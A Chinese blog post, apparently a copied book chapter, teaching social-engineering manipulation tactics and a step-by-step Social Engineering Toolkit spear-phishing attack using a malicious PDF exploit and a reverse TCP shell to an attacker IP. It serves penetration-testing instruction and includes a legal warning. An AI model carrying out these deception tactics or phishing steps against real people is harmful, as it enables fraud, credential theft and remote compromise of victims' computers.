<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Kali操作之五社会工程学 « NotBeCN</title>
  <meta name="description" content="         ◆社会工程学：如果目标网络没有直接的入口，欺骗的艺术将起到抛砖引玉的重要作用。对目标组织中的人员进行定向攻击，很有可能帮助我们找到渗透目标系统的入口。例如：诱使用户运行会安装后门的恶意程序。社会工程学渗透分为多种不同形式，伪装成网络管理员，通过电话要求用户提供给自己的账户信息，发送钓鱼邮件来劫持...">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://notbe.cn/2019/05/12/qq_42103479_90136902.html">
  <link rel="alternate" type="application/rss+xml" title="NotBeCN" href="https://notbe.cn/feed.xml" />
</head>


  <body>

    <div class="header-placeholder"></div>
<header class="header">
  <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    <a class="site-title" href="/">NotBeCN</a>
    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/" target="_blank">关于</a>
      
        
        <a class="page-link" href="https://uzshare.com" target="_blank">社区</a>
      
        
        <a class="page-link" href="/donate/" target="_blank">Donate</a>
      
        
        <a class="page-link" href="/games/shejiyazi/" target="_blank">射个鸭子</a>
      
    </nav>
  </div>
</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="col-main">
          <div class="post">

  <header class="post-header">
    <h1 class="post-title">Kali操作之五社会工程学</h1>
    <p class="post-meta">May 12, 2019</p>
  </header>

  <article class="post-content">
    <div id="article_content" class="article_content clearfix csdn-tracking-statistics" data-pid="blog" data-mod="popu_307" data-dsm="post"> 
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-f57960eb32.css"> 
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-f57960eb32.css"> 
 <div class="htmledit_views" id="content_views"> 
  <p style="margin-left:0cm;"><strong><span style="color:#FF0000;">◆社会工程学：</span></strong>如果目标网络没有直接的入口，欺骗的艺术将起到抛砖引玉的重要作用。对目标组织中的人员进行定向攻击，很有可能帮助我们找到渗透目标系统的入口。例如：诱使用户运行会安装后门的恶意程序。社会工程学渗透分为多种不同形式，伪装成网络管理员，通过电话要求用户提供给自己的账户信息，发送钓鱼邮件来劫持用户的银行账户，甚至是诱使某人出现在某个地点。</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp; <a name="_Hlk8457049">▶</a>社会工程学是利用人性弱点体察、获取有价值信息的实践方法，它是一种欺骗的艺术。在缺 少目标系统的必要信息时，社会工程学技术是渗透测试人员获取信息的至关重要的手段。对 所有类型的组织（单位）而言，人都是安全防范措施里最薄弱的一环，也是整个安全基础设 施最脆弱的层面。人都是社会的产物，人的本性就是社会性，所以人都有社会学方面的弱点 都易受社会工程学攻击。社会工程学的攻击人员通常利用社会工程学手段获取机密信息，甚 至可以造访受限区域。社会工程学的方式多种多样，而且每种方法的效果和导向完全取决于 使用人员的想象能力。本章将阐述社会工程学核心原则，并会介绍专业的社会工程攻击人员 用其操纵他人或挖掘信息的实例。</p> 
  <p style="margin-left:0cm;">本章分为以下几个部分：</p> 
  <p style="margin-left:0cm;">●&nbsp;&nbsp;&nbsp; 透过心理学的基本原理，带领读者大致了解社会工程学的手段和目标。</p> 
  <p style="margin-left:0cm;">●&nbsp;&nbsp;&nbsp; 通过几个真实的例子，演示社会工程学的攻击过程及使用方法。</p> 
  <p style="margin-left:0cm;">从安全角度来看，社会工程学是以获取特定信息为目标的操纵他人的有力武器。很多单位都 使用社会工程学的方法进行安全评估，以考核雇员的安全完整性，并通过这种方法调查工作 流程和人员方面的安全弱点。需要注意的是，社会工程学是种很常见的技术，可以说各种人 员都会使用这种技术。无论是渗透测试人员，还是诈骗专家、身份窃贼、商业合作伙伴、求 职人员、销售人员、信息经纪人、电话推销员、政府间谍、心怀不满的员工，甚至日常生活 中的孩童都会使用这种技术，只是他们的动机不同而已。</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ▶人类心理学建模</p> 
  <p style="margin-left:0cm;">人类的心理取决于感官的输入。感官的作用是形成对现实的感知。按照感官对自然现象的识 别作用来划分，人的感官可分成视觉、听觉、味觉、触觉、嗅觉、平衡和加速、温度、动 觉、疼痛感和方向感的感官。人类正是利用、发展他们的这些感官的功能，得以感知外部世 界。站在社会工程学的立场，任何通过显性感觉（视觉或听觉）、眼晴的动作（眼神接触、 口头上的差异、眨眼频率或眼睛暗示）、面部表情（惊喜、幸福、恐惧、悲伤、愤怒或厌 恶）和其他抽象实体进行观察或感觉收集到的信息，都可增加成功获取目标信息的概率。大 多数情况下，社会工程学工程师必须直接与目标进行沟通，才能获取机密信息或受限区域的 访问权。沟通形式可以是直接见面的接触方式，也可以是通过电子辅助技术进行的不见面接 触方式。在实际工作中，常见的沟通方式分为两类：面谈或问询。但是，这两种方法都受到 其他因素的制约，例如环境因素、对目标的熟悉程度和控制沟通模式的能力。所有这些因素 （沟通、环境、知识和沟通模式控制）构成社会工程学工程师必备的基本技能。整个社会工 程学活动取决于攻击者与目标之间的信任关系。如果不能与目标建立足够的信任关系，则所有的努力都可能付之东流。</p> 
  <p style="margin-left:0cm;">&nbsp; ▶<strong><span style="color:#00b050;">攻击过程</span></strong></p> 
  <p style="margin-left:0cm;">本节将介绍一些发动社会工程学攻击的基本步骤。虽然这不是社会工程学攻击的唯一方法， 甚至可以说没有成功率高的正式方法，但是本文的这些步骤可帮助您形成社会工程学的基本 认识。情报收集、识别漏洞、规划攻击和执行攻击——社会工程学工程师通常都会采用这些 某本步骤，它们可有效获取目标的有关信息或访问权限。</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#00b050;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1.&nbsp; </span><span style="color:#00b050;">情报收集：</span>多种技术都可用于找到最容易攻破的渗透测试目标。例如，我们可采用髙级搜 索工具收集被测公司员工的E-mail地址；通过社交网络收集被测单位员工的个人信息；识別被 测单位组织使用的第三方软件包；参与他们的经营活动、社交活动和参加其会议等。以这些 方式提供的情报，能够准确地推测出社会工程学意义上的“线人”。</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#00b050;">2. </span><span style="color:#00b050;">识别漏洞：</span>一旦选定了关键线人，接下来就开始与对方建立信任关系和友谊。这样就可以 在不伤害、不惊动目标的情况下，截获被测单位的机密信息。保持行动的隐蔽性和保密性， 对于整个过程来说至关重要。另外，也可以调査被测单位是否使用了旧版本软件，继而通过 恶意的E-mail或Web内容，利用软件漏洞感染当事人的计算机。</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#00b050;">&nbsp;3. </span><span style="color:#00b050;">规划攻击：</span>您可以对目标采取直截了当的攻击方式，也可以利用电子辅助技术被动地攻击 目标。以这些挖掘出来的情报入口着手，我们可以轻松地拟定攻击路径和攻击方法。例如， 被测单位的客户服务代表Bob和我们的关系很好，他还信任我们；他就可能在计算机上执行我 们发送的E-mail附件，而这种攻击不需要高级管理人员的任何事前授权。</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<span style="color:#00b050;">4.&nbsp;&nbsp;&nbsp; </span><span style="color:#00b050;">执行攻击：</span>社会工程学攻击的最后一步是执行攻击计划。此时，我们应该保持足够的信心 和耐心，主动监控和评估工作成果。完成这一步之后，社会工程学工程师掌握了充分信息， 甚至可以访问被测单位的内部系统，这些成果足以让他们进一步地渗透被测单位。在成功执 行攻击计划之后，社会工程学的攻击就可宣告结束。</p> 
  <p style="margin-left:0cm;">&nbsp;▶<span style="color:#00b050;">攻击方法</span></p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 社会工程学中，有5种有助于理解、识别、结交、准备目标的攻击方法。社会工程学按照它们 的特点，将它们进行了归类。本节介绍了一些真实的案例，以帮助读者在实际情况中灵活运 用各种所需方法。请注意这些攻击方法针对的是个人的心理学因素，要想提高这些方法的效 用，就应该进行定期的训练和练习。</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#00b050;">●</span>&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#00b050;">冒名顶替</span></p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; 攻击人员常常假装成他人以获取对方的信任。例如，在获取目标人员的银行信息方面，只要 目标人员使用&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; E-mail，我们就可以进行钓鱼攻击。这种攻击属于近乎完美的攻击方案。当决 定使用钓鱼攻击之后，攻击人员要大量地收集目标人员用过的&nbsp;&nbsp; E-mail 地址，然后伪造出与原 银行界面一样的网页界面，以诱骗目标人员。</p> 
  <p style="margin-left:0cm;">完成了以上准备之后，攻击人员会草拟并发送一份正式行文的E-mail（例如，银行账户更新通 知）。这些E-mail看上去就像真正银行发出来的邮件，要求目标人员访问某网址更新账户信 息。不过，邮件提到的网址将把目标人员提交的信息转发给攻击人员。攻击人员事先掌握了 特定的&nbsp; Web&nbsp;&nbsp; 技术，他们使用多种先进的工具（例如&nbsp; SSLstrip）就可以通过自动化手段轻松有 效地达成预定任务。与那些借助他人帮助的欺骗方法相比，这种方法通过模拟银行业务的手 段可直接达成冒名顶替的目的。</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ●<span style="color:#00b050;">投桃报李</span></p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 通过利益交换的方式达成双方各自利益的行为，被称为投桃报李。这类攻击需要长期业务合 作达成的非正式（私人）关系。利用公司之间的信任关系，可以轻松地找到可获取特定信息 的目标人员。例如Bob是一个专业黑客，他想知道ABC公司办公大楼的物理安全策略。进行仔 细考察之后，他决定制作一个廉价销售古玩的网站，以吸引两名雇员的关注。Bob&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 可事先通 过社交网站掌握这两人的个人信息，了解他们的&nbsp;&nbsp;&nbsp;&nbsp; E-mail&nbsp;&nbsp;&nbsp; 地址、网络论坛等资料。在这两人之 中，Alice在Bob的网站上定期采购商品，成为了Bob的主要目标。Bob决定要以一件稀有古董 换取她们公司的内部文件。利用人类心理学因素，他将向Alice发送了E-mail，以转让这件稀 有古董为筹码，要求Alice提供ABC公司的物理安全策略。在混淆了工作责任和个人利益的状 态下，Alice把公司信息透露给了Bob。在创建骗局的同时，通过价值交换的事情强化私人关 系，可成为社会工程学攻击的有效手段。</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ●<span style="color:#00b050;">狐假虎威</span></p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 冒充目标单位业务负责人的身份从而干预正常业务的做法就是狐假虎威。有些人认为，这种 攻击方法属于冒名顶替的一种特例。人们会出于本能下意识地接受权威和髙级管理人员的指 示，这个时候他们会无视自己否定性的直觉。这种天性使我们容易在特定的威胁面前毫无抵 抗力。例如，某人要通过XYZ公司的网络管理员获取网络认证的技术细节。经过一段时间的 专注分析，他可以通过利益交换方法获得网络管理员和CEO的电话号码。后来，他使用来电 号码的伪造服务（例如，www.spoofcard.com）给网络管理员打电话。此时，网管会认为该 电话来自CEO，将遵从攻击人员的指示。这种假冒权威人员身份的狐假虎威的做法，利用了 目标人员必须遵从公司高级管理人员指示的规律，诱导目标人员泄露信息。</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ●<span style="color:#00b050;">啖以重利</span></p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 人们常说“机不可失”，他们特别关注所谓机不可失的宝贵机会。这些想法都是人性贪婪一面的 写照。啖以重利的方法利用了人们渴求谋利机会的贪婪心理。著名的&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Nigerian 419 Scam（www.419eater.com）是利用人类贪欲的典型例子。让我们举一个例子，Bob想要收集XYZ大学里学生的个人信息。在他获取所有学生的E-mail地址的情况下，他可以向学生们发送 邮件并宣告：提供个人信息（姓名、地址、电话、电子邮件、出生日期、护照号码等）将免 费获赠&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iPod。由于这个创意专门针对在校学生设计，而且足以使他们确信能够免费获得最新 的&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iPod，所以多数的在校学生会落入这个骗局。在企业界，相应的攻击方法通常鼓吹可以获 得最大商业收益，达成业务目标。</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp; ●<span style="color:#00b050;">社会关系</span></p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 作为人，我们需要某种形式的社会关系，以分享思想、感情和想法。社会关系最易受攻击的 部分是“性”。多数情况下，异性总是互相吸引。由于这种强烈的感情和信任的错觉，人们可能 在不意间向对手透露信息。很多线上的社交门户网站都提供了见面和聊天的服务，以促进用 户间的社会交际。Facebook、MySpace、Twitter、Orkut&nbsp;&nbsp;&nbsp; 等网站都是如此。例如， XYZ公司 聘请了Bob，要他获取ABC公司财务策略和市场营销战略以保持自身的竞争优势。他首先査找 对方公司的雇员信息，发现&nbsp; ABC&nbsp;&nbsp;&nbsp; 公司负责所有业务运营的人是一个叫作&nbsp;&nbsp;&nbsp;&nbsp; Alice的女孩。因 此，他假装是一个普通的工商学的研究生，试图与Alice取得联系（例如，通过Facebook）。 后来，Bob 蓄意营造遇见&nbsp; Alice&nbsp;&nbsp; 的机会，共同出席聚会、年庆活动，一同造访舞厅、音乐厅等 地方。通过在见面期间的攀谈，Bob自然而然地获取到ABC公司有用的财务和市场策略信息。 请记住，达成的关系越有效，越信任，就越有利于社会工程学工程师达到目标。在信息安全 方面还有很多简化这些操作的工具。下一小节将会介绍的SET工具就是典型的社会工程学工 具。</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ●<span style="color:#00b050;">Social Engineering&nbsp; Toolkit</span><span style="color:#00b050;">（</span><span style="color:#00b050;">SET</span><span style="color:#00b050;">）</span></p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Social Engineering&nbsp; Toolkit（SET）是一款先进的多功能的社会工程学计算机辅助工具集。它由 TrustedSec（https://www.trustedsec.com）的创始人编写，可以行之有效地利用客户端应 用程序的漏洞获取目标的机息（例如E-mail密码）。SET可实现多种非常有效且实用的攻击方 法。其中，人们常用的方法有：用恶意附件对目标进行E-mail钓鱼攻击、Java&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; applet&nbsp;&nbsp;&nbsp; 攻击、 基于浏览器的漏洞攻击、收集网站认证信息、建立感染的便携媒体（USB/DVD/CD）、邮件 群发攻击及其他类似攻击。它是实现这些攻击方法的合成攻击平台。充分利用这个程序的极 具说服力的技术，可对人的因素进行深入测试。</p> 
  <p style="margin-left:0cm;">如需启动SET，可在终端中加载SET程序。</p> 
  <p style="margin-left:0cm;"><span style="color:#00b050;">root@kali:</span><span style="color:#00b050;">〜</span><span style="color:#00b050;">#&nbsp;&nbsp;&nbsp; setoolkit</span></p> 
  <p style="margin-left:0cm;">上述指令将显示如下选项</p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="532" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085225294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="795"></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="286" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085217951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="752"></p> 
  <p style="margin-left:0cm;">本例将演示通过恶意PDF附件发起钓鱼攻击的方法。在收件人打开附件时，他们的主机将被 攻陷。</p> 
  <p style="margin-left:0cm;"><span style="color:#00b050;">不要使用</span><span style="color:#00b050;">SET</span><span style="color:#00b050;">工具集自带的更新功能更新</span><span style="color:#00b050;">SET</span><span style="color:#00b050;">程序包。您应该使用</span><span style="color:#00b050;">Kali Linux&nbsp; </span><span style="color:#00b050;">系统的更新功</span> <span style="color:#00b050;">能，以获取</span><span style="color:#00b050;">SET&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color:#00b050;">软件的更新。</span></p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp; ▶定向钓鱼攻击</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果采用这种攻击方法，我们就要首先创建一个配合恶意PDF附件的E-mail模板，再选择适当 的PDF &nbsp;&nbsp;&nbsp; exploit&nbsp;&nbsp;&nbsp;&nbsp; payload，然后设置攻击平台与目标主机之间的连接关系，最后通过Gmail向目 标发送这封E-mail。需要注意的是，您可以通过Kali&nbsp; Linux自带的sendmail程序伪造原始发件 人的&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; E-mail 地址和&nbsp;&nbsp;&nbsp; IP&nbsp; 地址。Sendmail的配置文件是/usr/share/set/config/set_config。有关 程序的详细信息，请参考Social&nbsp;&nbsp;&nbsp;&nbsp; Engineer&nbsp; Toolkit（SET）的官方说明：http://www.socialengineer.org/framework/Social_Engineering_Framework。</p> 
  <p style="margin-left:0cm;"><span style="color:#00b050;">这种攻击方法的具体步骤如下。</span></p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#00b050;">●</span>1、在SET&nbsp;&nbsp;&nbsp; 程序的最初菜单里选择1，进入图8.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 所示的设置界面。</p> 
  <p style="margin-left:0cm;">&nbsp;</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#00b050;">●</span>2.、我们选择1，即Spear-fishing Attack Vectors，然后进入</p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="409" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085245484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="886"></p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#00b050;">●</span>3.、在上述选项中，我们必须选择&nbsp;&nbsp; 3，创建社会工程学邮件的模板。然后，我们书写邮件正文</p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="346" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085240761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="778"> &nbsp;</p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#00b050;">●</span>4.、虽然我们在上一步里写好了邮件的正文，但是并没有设置邮件的格式。模板生成程序会把你编辑的内容当作模板的一部分套用格式模板。在编辑完正文之后，使用Ctrl+C键返回上级菜 单。然后，进行E-mail攻击的有关设置。</p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="375" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085253591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="881"> 我们从Perform a&nbsp;&nbsp;&nbsp; Mass&nbsp; Email&nbsp; Attack菜单里选择1， 再选择8，即Adobe &nbsp;&nbsp; Cool&nbsp; Type&nbsp; SING &nbsp;&nbsp; Table “uniqueName”&nbsp;&nbsp; Overflow选项</p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="356" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085246264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="887"></p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="480" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/2019051208530684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="813"></p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#00b050;">●</span>5、接下来设置payload 类型。本例应该选择4，即Windows reverse&nbsp; TCP shell。然后设置目标 主机应当连接到的攻击平台（通常是Kali&nbsp;&nbsp;&nbsp;&nbsp; Linux&nbsp; 主机）的IP 和端口。本例假设攻击平台的IP地 址是192.168.198.130，服务端口是5555。我们进行相应设置</p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="423" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085302473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="853"></p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#00b050;">●</span>6、然后我们选择选项2更改文件名，以使文件名称引人注目。我们把&nbsp;&nbsp;&nbsp;&nbsp; payload&nbsp;&nbsp; 的文件名改成了fishing。</p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="246" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085245480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="809"> 然后，我们要让SET知道它要如何处理我们的payload。我们选择1，向单 个&nbsp;&nbsp; E-mail 地址发送&nbsp;&nbsp;&nbsp;&nbsp; payload；然后再选择&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1，使用先前编辑好的邮件模板。</p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="346" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085254151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="838"></p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#00b050;">●</span>7、接下来，我们选择先前创建的&nbsp;&nbsp;&nbsp; E-mail 模板（1）</p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="244" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085251483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTAzNDc5,size_16,color_FFFFFF,t_70" width="832"> 这样，SET 将在后续的社会工程学攻击里重复利用这个模板。你创建的模板的质量，很大程度上决定了钓鱼战役的实际效果。然后，我们使用有效的E-mail中转服务器或Gmail账户向目标人员发送攻击性E-mail。</p> 
  <p style="margin-left:0cm;"><img alt="" class="has" height="114" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190512085238171.png" width="757"></p> 
  <p style="margin-left:0cm;"><span style="color:#FF0000;">只有在测试条款里存在相应测试内容且客户明确理解测试内容的情况下，您才可以进行这种攻击测试。</span><span style="color:#FF0000;">SET</span><span style="color:#FF0000;">工具把感染文件发送给</span><span style="color:#FF0000;">E-mail</span><span style="color:#FF0000;">收件人，这种行为可能会引发法律问题。您需要</span> <span style="color:#FF0000;">参照发起测试地区的当地法律文件了解有关的法律规定。一旦您在</span><span style="color:#FF0000;">SET</span><span style="color:#FF0000;">中设置了</span><span style="color:#FF0000;">E-mail</span><span style="color:#FF0000;">信息，</span> <span style="color:#FF0000;">它就会立即建立连接发送文件。程序会在没有任何警告或提示的情况下直接发送</span><span style="color:#FF0000;">E-mail</span><span style="color:#FF0000;">。</span></p> 
  <p style="margin-left:0cm;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="color:#00b050;">●</span> 8、至此，我们已经向目标发起了攻击。现在我们等待受害人打开我们的恶意PDF 文件。在他/ 她打开PDF附件的时候，我们将通过反射shell连接到被害人电脑的shell。请注意，我们配置 的&nbsp;&nbsp; IP&nbsp; 地址&nbsp;&nbsp; 192.168.1.1&nbsp; 是攻击人员主机的&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IP地址（也就是Steven电脑的IP），它在5555端 口受理被害人电脑反射shell返回的连接。</p> 
  <p style="margin-left:0cm;">通过上述步骤，我们就完成了向目标发起社会工程学攻击的操作，并可远程访问被害人的主 机。我们可在shell的交互式提示符下执行Windows命令。</p> 
  <p style="margin-left:0cm;">SET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 可同时对一人或多人进行电子邮件的钓鱼攻击。它整合了可定制的&nbsp; E-mail 功能，便于社 会工程学工程师制定安全的攻击路线。这种功能可在攻击多个公司员工的同时保持攻击的隐 蔽性。</p> 
  <p style="margin-left:0cm;">SET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 的作者不断地更新着这个程序，以适应当前技术的剧烈变化。不过，它的功能可见一 斑。强烈建议读者访问作者的网站，继续领略&nbsp;&nbsp;&nbsp;&nbsp; SET&nbsp;&nbsp;&nbsp;&nbsp; 的风采。它的官方网站 是<span style="color:#00b050;">https://www.trustedsec.com/downloads/social- engineer-toolkit/</span><span style="color:#00b050;">。</span></p> 
